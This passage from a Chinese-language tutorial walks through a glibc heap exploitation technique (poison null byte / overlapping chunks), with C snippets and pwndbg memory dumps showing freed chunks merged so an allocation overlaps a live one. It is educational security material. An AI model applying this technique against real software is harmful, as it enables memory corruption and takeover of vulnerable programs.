0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000200      <-- chunk b [was free] size
0x603120:	0x00007ffff7dd1b78	0x00007ffff7dd1b78      fd, bk
0x603130:	0x0000000000000000	0x0000000000000000
....
....
....
0x603300:	0x0000000000000000	0x0000000000000000
0x603310:	0x0000000000000200	0x0000000000000000      <-- fake c prev_size
0x603320:	0x0000000000000210	0x0000000000000110      <-- chunk c
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
```

通过输出我们也能看到，新的 b size 值为 0x200，同时也将 chunk c fake 掉了。

接下来会 pass check：`chunksize(P) == 0x200 == 0x200 == prev_size(next_chunk(P))`

``` c++
	b1 = malloc(0x100);

	fprintf(stderr, "b1: %p\n",b1);
	fprintf(stderr, "Now we malloc 'b1'. It will be placed where 'b' was. "
		"At this point c.prev_size should have been updated, but it was not: %#lx\n",*c_prev_size_ptr);
	fprintf(stderr, "Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
```

接下来 create chunk b1，glibc 会从 free 掉的 chunk b（已经放入了 unsortedbin）中取出合适的大小。

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x7ffff7dd1d68 <main_arena+584>, 
  bk = 0x7ffff7dd1d68 <main_arena+584>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603220 PREV_INUSE {
  prev_size = 0, 
  size = 241, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603310 {
  prev_size = 240, 
  size = 0, 
  fd = 0x210, 
  bk = 0x110, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> unsortedbin 
unsortedbin
all: 0x603220 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603220 /* ' 2`' */
```

```
pwndbg> p b
$8 = (uint8_t *) 0x603120 "h\035\335\367\377\177"
pwndbg> p b1
$9 = (uint8_t *) 0x603120 "h\035\335\367\377\177"
```

此时 chunk b1 的位置就是 chunk b 的位置；
chunk b1 和 c 之间有个 chunk b，这时候 chunk c 的 prev_size 本应该变为 0xf0，但是事实上是：

```
pwndbg> x/30gx 0x603330-0x20
0x603310:	0x00000000000000f0	0x0000000000000000      <-- fake chunk c
0x603320:	0x0000000000000210	0x0000000000000110      <-- chunk c
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
0x6033e0:	0x0000000000000000	0x0000000000000000
0x6033f0:	0x0000000000000000	0x0000000000000000
pwndbg> p c
$10 = (uint8_t *) 0x603330 ""
```

这是因为我们 fake 了一个 c.prev_size，系统修改的是我们的 fake c.prev_size。所以 chunk c 仍然认为 chunk b 的地方有一个大小为 0x210 的 chunk。接下来我们新建一个 chunk b2。

``` c++
	b2 = malloc(0x80);
	fprintf(stderr, "b2: %p\n",b2);

	memset(b2,'B',0x80);
	fprintf(stderr, "Current b2 content:\n%s\n",b2);
```

此时的 heap 内存数据：

```
pwndbg> x/124gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk a
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000111      <-- chunk b1
0x603120:	0x00007ffff7dd1d68	0x00007ffff7dd1d68      fd, bk
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
0x603150:	0x0000000000000000	0x0000000000000000
0x603160:	0x0000000000000000	0x0000000000000000
0x603170:	0x0000000000000000	0x0000000000000000
0x603180:	0x0000000000000000	0x0000000000000000
0x603190:	0x0000000000000000	0x0000000000000000
0x6031a0:	0x0000000000000000	0x0000000000000000
0x6031b0:	0x0000000000000000	0x0000000000000000
0x6031c0:	0x0000000000000000	0x0000000000000000
0x6031d0:	0x0000000000000000	0x0000000000000000
0x6031e0:	0x0000000000000000	0x0000000000000000
0x6031f0:	0x0000000000000000	0x0000000000000000
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000000000
0x603220:	0x0000000000000000	0x0000000000000091      <-- chunk b2
0x603230:	0x00007ffff7dd1b78	0x00007ffff7dd1b78      fd, bk
0x603240:	0x0000000000000000	0x0000000000000000
0x603250:	0x0000000000000000	0x0000000000000000
0x603260:	0x0000000000000000	0x0000000000000000
0x603270:	0x0000000000000000	0x0000000000000000
0x603280:	0x0000000000000000	0x0000000000000000
0x603290:	0x0000000000000000	0x0000000000000000
0x6032a0:	0x0000000000000000	0x0000000000000000
0x6032b0:	0x0000000000000000	0x0000000000000061
0x6032c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000000	0x0000000000000000
0x6032f0:	0x0000000000000000	0x0000000000000000
0x603300:	0x0000000000000000	0x0000000000000000
0x603310:	0x0000000000000060	0x0000000000000000      <-- fake c prev_size
0x603320:	0x0000000000000210	0x0000000000000110      <-- chunk c
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
```

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x7ffff7dd1d68 <main_arena+584>, 
  bk = 0x7ffff7dd1d68 <main_arena+584>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603220 PREV_INUSE {
  prev_size = 0, 
  size = 145, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6032b0 FASTBIN {
  prev_size = 0, 
  size = 97, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603310 {
  prev_size = 96, 
  size = 0, 
  fd = 0x210, 
  bk = 0x110, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> unsortedbin 
unsortedbin
all: 0x6032b0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6032b0
```

接下来依次 free b1 和 c：

``` c++
	free(b1);
	free(c);
```

首先 free b1，这时 chunk c 会认为 b1 是 chunk b。当我们 free chunk c 的时候，chunk c 会和 chunk b1 合并。由于 chunk c 认为 chunk b1 依旧是 chunk b，因此会把中间的 chunk b2 吞并：

free b1：

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x6032b0, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603220 {
  prev_size = 272, 
  size = 144, 
  fd = 0x4242424242424242, 
  bk = 0x4242424242424242, 
  fd_nextsize = 0x4242424242424242, 
  bk_nextsize = 0x4242424242424242
}
0x6032b0 FASTBIN {
  prev_size = 0, 
  size = 97, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, 
  bk = 0x603110, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603310 {
  prev_size = 96, 
  size = 0, 
  fd = 0x210, 
  bk = 0x110, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> unsortedbin 
unsortedbin
all: 0x603110 —▸ 0x6032b0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
```

free c：

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 801, 
  fd = 0x6032b0, 
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603430 {
  prev_size = 800, 
  size = 272, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0, 
  size = 133825, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> unsortedbin 
unsortedbin
all: 0x603110 —▸ 0x6032b0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
```

```
pwndbg> x/124gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk a
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000321      <-- chunk b1
0x603120:	0x00000000006032b0	0x00007ffff7dd1b78
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
0x603150:	0x0000000000000000	0x0000000000000000
0x603160:	0x0000000000000000	0x0000000000000000
0x603170:	0x0000000000000000	0x0000000000000000
0x603180:	0x0000000000000000	0x0000000000000000
0x603190:	0x0000000000000000	0x0000000000000000
0x6031a0:	0x0000000000000000	0x0000000000000000
0x6031b0:	0x0000000000000000	0x0000000000000000
0x6031c0:	0x0000000000000000	0x0000000000000000
0x6031d0:	0x0000000000000000	0x0000000000000000
0x6031e0:	0x0000000000000000	0x0000000000000000
0x6031f0:	0x0000000000000000	0x0000000000000000
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000000000
0x603220:	0x0000000000000110	0x0000000000000090      <-- chunk b2
0x603230:	0x4242424242424242	0x4242424242424242
0x603240:	0x4242424242424242	0x4242424242424242
0x603250:	0x4242424242424242	0x4242424242424242
0x603260:	0x4242424242424242	0x4242424242424242
0x603270:	0x4242424242424242	0x4242424242424242
0x603280:	0x4242424242424242	0x4242424242424242
0x603290:	0x4242424242424242	0x4242424242424242
0x6032a0:	0x4242424242424242	0x4242424242424242
0x6032b0:	0x0000000000000000	0x0000000000000061
0x6032c0:	0x00007ffff7dd1b78	0x0000000000603110
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000000	0x0000000000000000
0x6032f0:	0x0000000000000000	0x0000000000000000
0x603300:	0x0000000000000000	0x0000000000000000
0x603310:	0x0000000000000060	0x0000000000000000
0x603320:	0x0000000000000210	0x0000000000000110      <-- chunk c
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
```

此时 chunk b2 已经被吞并。

``` c++
	fprintf(stderr, "Finally, we allocate 'd', overlapping 'b2'.\n");
	d = malloc(0x300);
	fprintf(stderr, "d: %p\n",d);
```

然后我们再把这一块 create 出来，申请 d：

```
pwndbg> heap
0x603000 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603110 PREV_INUSE {
  prev_size = 0, 
  size = 801, 
  fd = 0x7ffff7dd1e88 <main_arena+872>, 
  bk = 0x7ffff7dd1e88 <main_arena+872>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603430 PREV_INUSE {
  prev_size = 800, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x603540 PREV_INUSE {
  prev_size = 0, 
  size = 133825, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

```
pwndbg> x/124gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk a
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000321      <-- chunk d
0x603120:	0x00007ffff7dd1e88	0x00007ffff7dd1e88
0x603130:	0x0000000000000000	0x0000000000000000
0x603140:	0x0000000000000000	0x0000000000000000
0x603150:	0x0000000000000000	0x0000000000000000
0x603160:	0x0000000000000000	0x0000000000000000
0x603170:	0x0000000000000000	0x0000000000000000
0x603180:	0x0000000000000000	0x0000000000000000
0x603190:	0x0000000000000000	0x0000000000000000
0x6031a0:	0x0000000000000000	0x0000000000000000
0x6031b0:	0x0000000000000000	0x0000000000000000
0x6031c0:	0x0000000000000000	0x0000000000000000
0x6031d0:	0x0000000000000000	0x0000000000000000
0x6031e0:	0x0000000000000000	0x0000000000000000
0x6031f0:	0x0000000000000000	0x0000000000000000
0x603200:	0x0000000000000000	0x0000000000000000
0x603210:	0x0000000000000000	0x0000000000000000
0x603220:	0x0000000000000110	0x0000000000000090      <-- chunk b2 [freed]
0x603230:	0x4242424242424242	0x4242424242424242
0x603240:	0x4242424242424242	0x4242424242424242
0x603250:	0x4242424242424242	0x4242424242424242
0x603260:	0x4242424242424242	0x4242424242424242
0x603270:	0x4242424242424242	0x4242424242424242
0x603280:	0x4242424242424242	0x4242424242424242
0x603290:	0x4242424242424242	0x4242424242424242
0x6032a0:	0x4242424242424242	0x4242424242424242
0x6032b0:	0x0000000000000000	0x0000000000000061
0x6032c0:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8
0x6032d0:	0x0000000000000000	0x0000000000000000
0x6032e0:	0x0000000000000000	0x0000000000000000
0x6032f0:	0x0000000000000000	0x0000000000000000
0x603300:	0x0000000000000000	0x0000000000000000
0x603310:	0x0000000000000060	0x0000000000000000
0x603320:	0x0000000000000210	0x0000000000000110      <-- chunk c [freed]
0x603330:	0x0000000000000000	0x0000000000000000
0x603340:	0x0000000000000000	0x0000000000000000
0x603350:	0x0000000000000000	0x0000000000000000
0x603360:	0x0000000000000000	0x0000000000000000
0x603370:	0x0000000000000000	0x0000000000000000
0x603380:	0x0000000000000000	0x0000000000000000
0x603390:	0x0000000000000000	0x0000000000000000
0x6033a0:	0x0000000000000000	0x0000000000000000
0x6033b0:	0x0000000000000000	0x0000000000000000
0x6033c0:	0x0000000000000000	0x0000000000000000
0x6033d0:	0x0000000000000000	0x0000000000000000
```

此时我们就可以对 b2 进行任意写了：

``` c++
	fprintf(stderr, "Now 'd' and 'b2' overlap.\n");
	memset(d,'D',0x300);

	fprintf(stderr, "New b2 content:\n%s\n",b2);
```

```
pwndbg> x/124gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000111      <-- chunk a
0x603010:	0x0000000000000000	0x0000000000000000
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000321      <-- chunk d
0x603120:	0x4444444444444444	0x4444444444444444
0x603130:	0x4444444444444444	0x4444444444444444
0x603140:	0x4444444444444444	0x4444444444444444
0x603150:	0x4444444444444444	0x4444444444444444
0x603160:	0x4444444444444444	0x4444444444444444
0x603170:	0x4444444444444444	0x4444444444444444
0x603180:	0x4444444444444444	0x4444444444444444
0x603190:	0x4444444444444444	0x4444444444444444
0x6031a0:	0x4444444444444444	0x4444444444444444
0x6031b0:	0x4444444444444444	0x4444444444444444
0x6031c0:	0x4444444444444444	0x4444444444444444
0x6031d0:	0x4444444444444444	0x4444444444444444
0x6031e0:	0x4444444444444444	0x4444444444444444
0x6031f0:	0x4444444444444444	0x4444444444444444
0x603200:	0x4444444444444444	0x4444444444444444
0x603210:	0x4444444444444444	0x4444444444444444
0x603220:	0x4444444444444444	0x4444444444444444      <-- chunk b2 [written]
0x603230:	0x4444444444444444	0x4444444444444444
0x603240:	0x4444444444444444	0x4444444444444444
0x603250:	0x4444444444444444	0x4444444444444444
0x603260:	0x4444444444444444	0x4444444444444444
0x603270:	0x4444444444444444	0x4444444444444444
0x603280:	0x4444444444444444	0x4444444444444444
0x603290:	0x4444444444444444	0x4444444444444444
0x6032a0:	0x4444444444444444	0x4444444444444444
0x6032b0:	0x4444444444444444	0x4444444444444444
0x6032c0:	0x4444444444444444	0x4444444444444444
0x6032d0:	0x4444444444444444	0x4444444444444444
0x6032e0:	0x4444444444444444	0x4444444444444444
0x6032f0:	0x4444444444444444	0x4444444444444444
0x603300:	0x4444444444444444	0x4444444444444444
0x603310:	0x4444444444444444	0x4444444444444444
0x603320:	0x4444444444444444	0x4444444444444444      <-- chunk c [freed]
0x603330:	0x4444444444444444	0x4444444444444444
0x603340:	0x4444444444444444	0x4444444444444444
0x603350:	0x4444444444444444	0x4444444444444444
0x603360:	0x4444444444444444	0x4444444444444444
0x603370:	0x4444444444444444	0x4444444444444444
0x603380:	0x4444444444444444	0x4444444444444444
0x603390:	0x4444444444444444	0x4444444444444444
0x6033a0:	0x4444444444444444	0x4444444444444444
0x6033b0:	0x4444444444444444	0x4444444444444444
0x6033c0:	0x4444444444444444	0x4444444444444444
0x6033d0:	0x4444444444444444	0x4444444444444444
```